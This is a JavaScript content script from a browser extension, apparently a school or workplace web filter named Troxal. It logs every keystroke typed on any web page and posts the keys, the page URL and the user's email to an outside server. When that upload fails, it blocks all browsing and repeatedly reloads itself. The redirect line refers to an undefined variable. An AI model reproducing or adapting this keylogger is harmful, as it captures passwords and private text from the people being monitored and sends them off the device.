var useremail;
chrome.extension.sendMessage({}, function(response) {
  useremail = response.email
});
var timeout = null;
var errorcount = '0';
var key = '';
var j = {};
j.query = jQuery.noConflict( true );
j.query(this).keypress((e) => {
clearTimeout(timeout);
key = key + e.key;  
timeout = setTimeout(function () {
    j.query.post("https://api.troxal.com/troxal/report/key/", {
            typed: key,
            domain: window.location.href,
            user: useremail
        },
        function(data, status) {})
        .fail(function() { 
            chrome.webRequest.onBeforeRequest.addListener(function(details) { return {redirectUrl: "https://block.troxal.com?u=" + o.email + '&url=' + details.url + '&reason=key'} }, {urls: ['*://*/*'] },["blocking"]);
                            chrome.tabs.create({
                                url: chrome.extension.getURL('error.html'),
                                active: false
                            }, function(tab) {
                                chrome.windows.create({
                                    tabId: tab.id,
                                    type: 'popup',
                                    focused: true
                                });
                            });
                            setInterval(function() { chrome.runtime.reload(); }, 5 * 1000);  
        });
        key = '';
    }, 500);  
})